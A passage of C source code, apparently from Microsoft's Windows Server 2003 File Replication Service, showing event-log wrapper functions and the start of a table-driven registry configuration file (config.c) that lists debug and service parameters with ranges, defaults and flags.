    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;

    if (FrsEventLogFilter(EventMessageId, ArgArray, 3)) {
        FrsReportEvent(EventMessageId, ArgArray, 3);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 3);
}



VOID
FrsEventLog4(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3,
    IN PWCHAR   EventMessage4
    )
{
#undef DEBSUB
#define DEBSUB "FrsEventLog4:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[4];


    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;
    ArgArray[3] = EventMessage4;
    if (FrsEventLogFilter(EventMessageId, ArgArray, 4)) {
        FrsReportEvent(EventMessageId, ArgArray, 4);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 4);
}





VOID
FrsEventLog5(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3,
    IN PWCHAR   EventMessage4,
    IN PWCHAR   EventMessage5
    )
{
#undef DEBSUB
#define DEBSUB "FrsEventLog5:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[5];


    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;
    ArgArray[3] = EventMessage4;
    ArgArray[4] = EventMessage5;
    if (FrsEventLogFilter(EventMessageId, ArgArray, 5)) {
        FrsReportEvent(EventMessageId, ArgArray, 5);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 5);
}





VOID
FrsEventLog6(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3,
    IN PWCHAR   EventMessage4,
    IN PWCHAR   EventMessage5,
    IN PWCHAR   EventMessage6
    )

{
#undef DEBSUB
#define DEBSUB "FrsEventLog6:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[6];

    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;
    ArgArray[3] = EventMessage4;
    ArgArray[4] = EventMessage5;
    ArgArray[5] = EventMessage6;
    if (FrsEventLogFilter(EventMessageId, ArgArray, 6)) {
        FrsReportEvent(EventMessageId, ArgArray, 6);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 6);
}




VOID
FrsEventLog7(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3,
    IN PWCHAR   EventMessage4,
    IN PWCHAR   EventMessage5,
    IN PWCHAR   EventMessage6,
    IN PWCHAR   EventMessage7
    )

{
#undef DEBSUB
#define DEBSUB "FrsEventLog7:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[7];

    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;
    ArgArray[3] = EventMessage4;
    ArgArray[4] = EventMessage5;
    ArgArray[5] = EventMessage6;
    ArgArray[6] = EventMessage7;
    if (FrsEventLogFilter(EventMessageId, ArgArray, 7)) {
        FrsReportEvent(EventMessageId, ArgArray, 7);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 7);
}




VOID
FrsEventLog8(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3,
    IN PWCHAR   EventMessage4,
    IN PWCHAR   EventMessage5,
    IN PWCHAR   EventMessage6,
    IN PWCHAR   EventMessage7,
    IN PWCHAR   EventMessage8
    )

{
#undef DEBSUB
#define DEBSUB "FrsEventLog8:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[8];

    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;
    ArgArray[3] = EventMessage4;
    ArgArray[4] = EventMessage5;
    ArgArray[5] = EventMessage6;
    ArgArray[6] = EventMessage7;
    ArgArray[7] = EventMessage8;

    if (FrsEventLogFilter(EventMessageId, ArgArray, 8)) {
        FrsReportEvent(EventMessageId, ArgArray, 8);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 8);
}



VOID
FrsEventLog9(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3,
    IN PWCHAR   EventMessage4,
    IN PWCHAR   EventMessage5,
    IN PWCHAR   EventMessage6,
    IN PWCHAR   EventMessage7,
    IN PWCHAR   EventMessage8,
    IN PWCHAR   EventMessage9
    )

{
#undef DEBSUB
#define DEBSUB "FrsEventLog9:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[9];

    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    ArgArray[2] = EventMessage3;
    ArgArray[3] = EventMessage4;
    ArgArray[4] = EventMessage5;
    ArgArray[5] = EventMessage6;
    ArgArray[6] = EventMessage7;
    ArgArray[7] = EventMessage8;
    ArgArray[8] = EventMessage9;

    if (FrsEventLogFilter(EventMessageId, ArgArray, 9)) {
        FrsReportEvent(EventMessageId, ArgArray, 9);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 9);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\util\config.c ===
/*++

Copyright (c) 1997-1999 Microsoft Corporation

Module Name:

    config.c

Abstract:

    GetConfigParam reads a configuration keyword from the registry.

Author:

    David Orbits - June-1999  Complete Rewrite to make table driven.

Environment:


Revision History:

--*/

#include <ntreppch.h>
#pragma  hdrstop

#include <ctype.h>
#include <frs.h>
#include <ntfrsapi.h>

#define FULL_KEY_BUFF_SIZE  8192

VOID
FrsRegPostEventLog(
    IN  PFRS_REGISTRY_KEY KeyCtx,
    IN  PWCHAR            KeyArg1,
    IN  ULONG             Flags,
    IN  LONG              IDScode
);


PGEN_TABLE ReparseTagTable;

//
// Possible errors are:
//      required key not present
//      required value not present
//      value out of range

//
// **** NOTE:  Also use this for FRS tuning parameters to select between
// workstation and server operation modes.  Create a table with a list of the
// parameter codes and override values for the min, max and defaults.
// Apply during startup to reduce server footprint.
//


typedef struct _FRS_REG_KEY_REVISIONS {

    LONG            FrsKeyCode;      // Frs code name for this key.

    DWORD           ValueMin;        // Minimum data value, or string len
    DWORD           ValueMax;        // Maximum Data value, or string len
    DWORD           ValueDefault;    // Default data value if not present.
} FRS_REG_KEY_REVISIONS, *PFRS_REG_KEY_REVISIONS;


FRS_REG_KEY_REVISIONS FrsRegKeyRevisionTable[] = {

    {FKC_DEBUG_MAX_LOG          , 0     , MAXLONG,  10000      },
    {FKC_MAX_REPLICA_THREADS    , 2     , 10,       2          },
    {FKC_MAX_RPC_SERVER_THREADS , 2     , 10,       2          },
    {FKC_MAX_INSTALLCS_THREADS  , 2     , 10,       2          },
    {FKC_MAX_STAGE_GENCS_THREADS, 2     , 10,       2          },
    {FKC_MAX_STAGE_FETCHCS_THREADS, 2   , 10,       2          },
    {FKC_MAX_INITSYNCCS_THREADS,  2     , 10,       2          },
    {FKC_SNDCS_MAXTHREADS_PAR   , 2     , 10,       2          },
    {FKC_MAX_NUMBER_REPLICA_SETS, 1     , 10,       5          },
    {FKC_MAX_NUMBER_JET_SESSIONS, 1     , 50,       50         },

    {FKC_END_OF_TABLE, 0, 0, 0 }
};

//
// See sdk\inc\ntconfig.h if more registry data types are added.
//

#define NUMBER_OF_REG_DATATYPES 12

PWCHAR RegDataTypeNames[NUMBER_OF_REG_DATATYPES] = {

L"REG_NONE"                       , // ( 0 )   No value type
L"REG_SZ"                         , // ( 1 )   Unicode nul terminated string
L"REG_EXPAND_SZ"                  , // ( 2 )   Unicode nul terminated string (with environment variable references)
L"REG_BINARY"                     , // ( 3 )   Free form binary
L"REG_DWORD"                      , // ( 4 )   32-bit number
L"REG_DWORD_BIG_ENDIAN"           , // ( 5 )   32-bit number
L"REG_LINK"                       , // ( 6 )   Symbolic Link (unicode)
L"REG_MULTI_SZ"                   , // ( 7 )   Multiple Unicode strings
L"REG_RESOURCE_LIST"              , // ( 8 )   Resource list in the resource map
L"REG_FULL_RESOURCE_DESCRIPTOR"   , // ( 9 )   Resource list in the hardware description
L"REG_RESOURCE_REQUIREMENTS_LIST" , // ( 10 )
L"REG_QWORD"                        // ( 11 )  64-bit number
};

#define REG_DT_NAME(_code_)                                                \
    (((_code_) < NUMBER_OF_REG_DATATYPES) ?                                \
         RegDataTypeNames[(_code_)] : RegDataTypeNames[0])

//
//
// If a range check fails the event EVENT_FRS_PARAM_OUT_OF_RANGE is logged if
// FRS_RKF_LOG_EVENT is set.
//
// If a syntax check fails the event EVENT_FRS_PARAM_INVALID_SYNTAX is logged if
// FRS_RKF_LOG_EVENT is set.
//
// If a required parameter is missing the event EVENT_FRS_PARAM_MISSING is logged
// if FRS_RKF_LOG_EVENT is set.
//

BOOL Win2kPro;


FLAG_NAME_TABLE RkfFlagNameTable[] = {
    {FRS_RKF_KEY_PRESENT            , "KeyPresent "         },
    {FRS_RKF_VALUE_PRESENT          , "ValuePresent "       },
    {FRS_RKF_DISPLAY_ERROR          , "ShowErrorMsg "       },
    {FRS_RKF_LOG_EVENT              , "ShowEventMsg "       },

    {FRS_RKF_READ_AT_START          , "ReadAtStart "        },
    {FRS_RKF_READ_AT_POLL           , "ReadAtPoll "         },
    {FRS_RKF_RANGE_CHECK            , "RangeCheck "         },
    {FRS_RKF_SYNTAX_CHECK           , "SyntaxCheck "        },

    {FRS_RKF_KEY_MUST_BE_PRESENT    , "KeyMustBePresent "   },
    {FRS_RKF_VALUE_MUST_BE_PRESENT  , "ValueMustBePresent " },
    {FRS_RKF_OK_TO_USE_DEFAULT      , "DefaultOK "          },
    {FRS_RKF_FORCE_DEFAULT_VALUE    , "ForceDefault "       },

    {FRS_RKF_DEBUG_MODE_ONLY        , "DebugMode "          },
    {FRS_RKF_TEST_MODE_ONLY         , "TestMode "           },
    {FRS_RKF_API_ACCESS_CHECK_KEY   , "DoAPIAccessChk "     },
    {FRS_RKF_CREATE_KEY             , "CreateKey "          },

    {FRS_RKF_KEEP_EXISTING_VALUE    , "KeepExistingValue "  },
    {FRS_RKF_KEY_ACCCHK_READ        , "DoReadAccessChk "    },
    {FRS_RKF_KEY_ACCCHK_WRITE       , "DoWriteAccessChk "   },
    {FRS_RKF_RANGE_SATURATE         , "RangeSaturate "      },

    {FRS_RKF_DEBUG_PARAM            , "DisplayAsDebugPar "  },

    {0, NULL}
};


//
// The following describes the registry keys used by FRS.
//      KeyName  ValueName DataUnits
//      RegValueType   DataValueType  Min  Max  Default  EventCode
//            FrsKeyCode  Flags
//
//
// Notation for keyName field.  Multiple key components separated by commas.
// Break on commas.  Open leading key then create/open each successive component.
// ARG1 means substitute the Arg1 PWSTR parameter passed to the function for this
// key component.  Most often this is a stringized guid.  The string FRS_RKEY_SET_N
// below will end up opening/creating the following key:
//
// "System\\CurrentControlSet\\Services\\NtFrs\\Parameters\\Replica Sets\\27d6d1c4-d6b8-480b-9f18b5ea390a0178"
// assuming the argument passed in was "27d6d1c4-d6b8-480b-9f18b5ea390a0178"
//
// see FrsRegOpenKey() for details.
//

FRS_REGISTRY_KEY FrsRegistryKeyTable[] = {


 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **                S e r v i c e   D e b u g   K e y s                        **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/


    //   Number of assert files
    {FRS_CONFIG_SECTION,  L"Debug Assert Files",       UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, 1000, 5, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_ASSERT_FILES,     FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Force an assert after N seconds (0 == don't assert)
    {FRS_CONFIG_SECTION,  L"Debug Force Assert in N Seconds",     UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 0, 1000, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_ASSERT_SECONDS,   FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT |
                                        FRS_RKF_TEST_MODE_ONLY},


    //   Share for copying log/assert files
    {FRS_CONFIG_SECTION,  L"Debug Share for Assert Files",       UNITS_NONE,
        REG_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_ASSERT_SHARE,     FRS_RKF_READ_AT_START     |
                                        FRS_RKF_DEBUG_PARAM},


    //   If TRUE, Break into the debugger, if present
    {FRS_CONFIG_SECTION,  L"Debug Break",              UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, FALSE,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_BREAK,            FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_TEST_MODE_ONLY    |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   If TRUE, copy log files into assert share
    {FRS_CONFIG_SECTION,  L"Debug Copy Log Files into Assert Share",     UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, FALSE,   EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_COPY_LOG_FILES,   FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Force real out of disk space errors on database operations
    {FRS_CONFIG_SECTION,  L"Debug Dbs Out Of Space",   UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, DBG_DBS_OUT_OF_SPACE_OP_MAX,  0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_DBS_OUT_OF_SPACE,  FRS_RKF_READ_AT_START     |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_READ_AT_POLL      |
                                         FRS_RKF_TEST_MODE_ONLY    |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_DEBUG_PARAM       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},


    //   Force Jet Err simulated out of disk space errors on database operations
    {FRS_CONFIG_SECTION,  L"Debug Dbs Out Of Space Trigger",   UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, MAXLONG,  0,   EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_DBS_OUT_OF_SPACE_TRIGGER, FRS_RKF_READ_AT_START     |
                                                FRS_RKF_LOG_EVENT         |
                                                FRS_RKF_READ_AT_POLL      |
                                                FRS_RKF_TEST_MODE_ONLY    |
                                                FRS_RKF_DEBUG_PARAM       |
                                                FRS_RKF_OK_TO_USE_DEFAULT},


    //   If TRUE, debug log file generation (DPRINTS and CO Trace output) is off.
    {FRS_CONFIG_SECTION,  L"Debug Disable",            UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, FALSE,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_DISABLE,          FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   The directory path for the FRS debug logs.
    {FRS_CONFIG_SECTION,  L"Debug Log File",           UNITS_NONE,
        REG_EXPAND_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_BAD_REG_DATA,
        L"%SystemRoot%\\debug",
            FKC_DEBUG_LOG_FILE,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_SYNTAX_CHECK      |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Number of debug log files to keep as history
    {FRS_CONFIG_SECTION,  L"Debug Log Files",          UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, 300, 5, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_LOG_FILES,        FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Number of debug log records written between file flushes.
    //   btw:  Severity 0 log records always force a log file flush.
    {FRS_CONFIG_SECTION,  L"Debug Log Flush Interval",       UNITS_NONE,
        REG_DWORD, DT_LONG, 1, MAXLONG, 20000, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_LOG_FLUSH_INTERVAL, FRS_RKF_READ_AT_START     |
                                          FRS_RKF_LOG_EVENT         |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_DEBUG_PARAM       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    //   Print debug msgs with severity level LE DEBUG_LOG_SEVERITY to debug log.
    // 0 - Most severe, eg. fatal inconsistency, mem alloc fail. Least noisey.
    // 1 - Important info, eg. Key config parameters, unexpected conditions
    // 2 - File tracking records.
    // 3 - Change Order Process trace records.
    // 4 - Status results, e.g. table lookup failures, new entry inserted
    // 5 - Information level messages to show flow.  Noisest level. Maybe in a loop
    // see also DEBUG_SEVERITY.
    {FRS_CONFIG_SECTION,  L"Debug Log Severity",       UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, 5,      2, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_LOG_SEVERITY,     FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Max number of debug log messages output before opening a new log file.
    {FRS_CONFIG_SECTION,  L"Debug Maximum Log Messages",            UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, MAXLONG, 20000, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_MAX_LOG,          FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   If >0, then track and check all mem alloc / dealloc.  (slow)
    //     1 - checks allocs and frees and prints stack of unalloced mem at exit
    //     2 - checks for mem alloc region overwrite on each alloc/free - very slow.
    //
    {FRS_CONFIG_SECTION,  L"Debug Mem",                UNITS_NONE,
        REG_DWORD, DT_ULONG, 0,      4,      0,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_MEM,              FRS_RKF_READ_AT_START     |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_TEST_MODE_ONLY    |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   If TRUE, then call HeapCompact(GetProcessHeap(), 0) on mem dealloc.  (slower)
    {FRS_CONFIG_SECTION,  L"Debug Mem Compact",        UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, FALSE,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_MEM_COMPACT,      FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_TEST_MODE_ONLY    |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Mail profile for sending mail notifications.  (future)
    {FRS_CONFIG_SECTION,  L"Debug Profile",           UNITS_NONE,
        REG_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_PROFILE,          FRS_RKF_READ_AT_START     |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_READ_AT_POLL},


    //   If TRUE, then check consistency of command queues on each queue op.  (slow)
    {FRS_CONFIG_SECTION,  L"Debug Queues",            UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, FALSE,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_QUEUES,           FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_TEST_MODE_ONLY    |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //   Mail recipients for sending mail notifications.  (future)
    {FRS_CONFIG_SECTION,  L"Debug Recipients",        UNITS_NONE,
        REG_EXPAND_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_RECIPIENTS,       FRS_RKF_READ_AT_START     |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_READ_AT_POLL},


    // Restart the service after an assertion failure iff the service was able
    // to run for at least DEBUG_RESTART_SECONDS before the assert hit.
    {FRS_CONFIG_SECTION,  L"Debug Restart if Assert after N Seconds",   UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 0, MAXLONG, 600, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_RESTART_SECONDS,  FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Print debug msgs with severity level LE DEBUG_SEVERITY to
    // stdout if running as -notservice.
    // see also DEBUG_LOG_SEVERITY.
    {FRS_CONFIG_SECTION,  L"Debug Severity",          UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, 5,      0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DEBUG_SEVERITY,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // If FALSE, Print debug msgs with severity level LE DEBUG_SEVERITY to
    // an attached debugger.                                 (slow)
    // see also DEBUG_LOG_SEVERITY.
    {FRS_CONFIG_SECTION,  L"Debug Suppress",          UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, TRUE,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_SUPPRESS,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //  Suppress debug prints from components in the DEBUG_SYSTEMS list.
    //  default is all components print.
    {FRS_CONFIG_SECTION,  L"Debug Systems",         UNITS_NONE,
        REG_EXPAND_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_SYSTEMS,          FRS_RKF_READ_AT_START     |
                                        FRS_RKF_DEBUG_PARAM       |
                                        FRS_RKF_READ_AT_POLL},


    //  Test code name for FRS_DEBUG_TEST_POINT macro.
    //
    {FRS_CONFIG_SECTION,  L"Debug Test Code Name",         UNITS_NONE,
        REG_EXPAND_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_TEST_CODE_NAME,          FRS_RKF_READ_AT_START     |
                                               FRS_RKF_READ_AT_POLL      |
                                               FRS_RKF_DEBUG_PARAM},


    //  Test sub-code number for FRS_DEBUG_TEST_POINT macro.
    //
    {FRS_CONFIG_SECTION,  L"Debug Test Code Number",         UNITS_NONE,
        REG_DWORD, DT_ULONG, 0xFFFFFFFF, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_TEST_CODE_NUMBER,          FRS_RKF_READ_AT_START     |
                                                 FRS_RKF_READ_AT_POLL      |
                                                 FRS_RKF_DEBUG_PARAM       |
                                                 FRS_RKF_OK_TO_USE_DEFAULT},


    //  Initial test trigger count for FRS_DEBUG_TEST_POINT macro.
    //
    {FRS_CONFIG_SECTION,  L"Debug Test Trigger Count",         UNITS_NONE,
        REG_DWORD, DT_ULONG, 0xFFFFFFFF, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_TEST_TRIGGER_COUNT,           FRS_RKF_READ_AT_START     |
                                                    FRS_RKF_READ_AT_POLL      |
                                                    FRS_RKF_DEBUG_PARAM       |
                                                    FRS_RKF_OK_TO_USE_DEFAULT},

    //  Test trigger refresh value for FRS_DEBUG_TEST_POINT macro.
    //
    {FRS_CONFIG_SECTION,  L"Debug Test Trigger Refresh",         UNITS_NONE,
        REG_DWORD, DT_ULONG, 0xFFFFFFFF, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_DEBUG_TEST_TRIGGER_REFRESH,         FRS_RKF_READ_AT_START     |
                                                    FRS_RKF_READ_AT_POLL      |
                                                    FRS_RKF_DEBUG_PARAM       |
                                                    FRS_RKF_OK_TO_USE_DEFAULT},


    // hklm\software\microsoft\windows nt\current version\buildlab
    {FRS_CURRENT_VER_SECTION,  L"buildlab",         UNITS_NONE,
        REG_SZ,  DT_UNICODE, 0, 0, 0,   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_BUILDLAB,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_DEBUG_PARAM},


 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **               S e r v i c e   C o n f i g   K e y s                       **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/

#define FRS_MUTUAL_AUTHENTICATION_IS  \
    L"Mutual authentication is [" FRS_IS_ENABLED L" or " FRS_IS_DISABLED L"]"



    //  Comm Timeout In Milliseconds
    // Unjoin the cxtion if the partner doesn't respond soon enough
    {FRS_CONFIG_SECTION,    L"Comm Timeout In Milliseconds",    UNITS_MILLISEC,
        REG_DWORD, DT_ULONG, 0, MAXLONG, (5 * 60 * 1000),  EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_COMM_TIMEOUT,           FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //  The directory filter exclusion list.   Default:  None
    //  Don't supply a default here.  See FRS_DS_COMPOSE_FILTER_LIST for why.
    {FRS_CONFIG_SECTION,    L"Directory Exclusion Filter List",   UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DIR_EXCL_FILTER_LIST,   FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_SYNTAX_CHECK      |
                                        FRS_RKF_READ_AT_POLL},


    //  The directory filter inclusion list.         Default:  None
    {FRS_CONFIG_SECTION,    L"Directory Inclusion Filter List",     UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DIR_INCL_FILTER_LIST,   FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_SYNTAX_CHECK      |
                                        FRS_RKF_CREATE_KEY        |
                                        FRS_RKF_OK_TO_USE_DEFAULT |
                                        FRS_RKF_READ_AT_POLL},


    //  Minutes between polls of the DS when data does not appear to be changing.
    {FRS_CONFIG_SECTION,   L"DS Polling Long Interval in Minutes", UNITS_MINUTES,
        REG_DWORD, DT_ULONG, NTFRSAPI_MIN_INTERVAL, NTFRSAPI_MAX_INTERVAL,
                             NTFRSAPI_DEFAULT_LONG_INTERVAL, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DS_POLLING_LONG_INTERVAL, FRS_RKF_READ_AT_START     |
                                          FRS_RKF_READ_AT_POLL      |
                                          FRS_RKF_LOG_EVENT         |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    //  Minutes between polls of the DS when data does appear to be changing.
    //  If no data in the DS has changed after 8 (DS_POLLING_MAX_SHORTS) short
    //  polling intervals then we fall back to DS_POLLING_LONG_INTERVAL.
    //  Note: if FRS is running on a DC always use the short interval.
    {FRS_CONFIG_SECTION,   L"DS Polling Short Interval in Minutes", UNITS_MINUTES,
        REG_DWORD, DT_ULONG, NTFRSAPI_MIN_INTERVAL, NTFRSAPI_MAX_INTERVAL,
                             NTFRSAPI_DEFAULT_SHORT_INTERVAL, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DS_POLLING_SHORT_INTERVAL, FRS_RKF_READ_AT_START     |
                                           FRS_RKF_READ_AT_POLL      |
                                           FRS_RKF_LOG_EVENT         |
                                           FRS_RKF_RANGE_CHECK       |
                                           FRS_RKF_OK_TO_USE_DEFAULT},


